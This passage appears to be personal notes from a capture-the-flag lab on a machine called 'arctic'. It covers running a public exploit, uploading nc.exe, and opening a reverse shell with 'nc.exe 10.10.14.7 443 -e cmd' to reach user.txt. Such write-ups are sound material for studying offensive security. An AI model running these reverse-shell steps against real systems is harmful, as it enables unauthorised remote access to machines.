Using the publicly available exploit, modified the value of LHOST and ran the exploit

Got shell as `arctic\tolis`
![[Pasted image 20240910103714.png]]

It seems its not a fully functional shell, and unable to `cd` into other directories. Unable to print output for `whoami /priv`

- Downloaded nc.exe binary on the victim machine
```powershell
nc.exe 10.10.14.7 443 -e cmd
```
- Got a functioning reverse shell and switched over to PowerShell
```powershell
powershell -File -
```
Found `user.txt` in `C:\Users\tolis\Desktop\tolis\user.txt`

